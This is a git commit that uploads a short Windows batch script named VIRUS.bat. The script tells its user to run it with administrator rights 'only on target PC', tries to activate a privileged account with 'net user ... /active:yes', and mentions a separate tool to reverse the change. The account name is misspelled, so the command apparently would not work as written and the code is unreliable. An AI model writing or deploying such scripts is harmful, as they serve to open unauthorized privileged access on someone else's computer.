6582d02bf4e0c2a899aa8c44b0bbc298302a51f4
HackconerGF <138873864+HackconerGF@users.noreply.github.com>
2023-07-15 12:33:41 +0300

    upload VIRUS.bat

---
+++ VIRUS.bat
@@ -0,0 +1,9 @@
+@echo off
+echo you need to run it as administator
+echo run this program only on target PC
+pause
+net user adminstartor /active:yes
+echo command complete
+pause
+cls
+echo run reverse tool on this PC to reverse changes
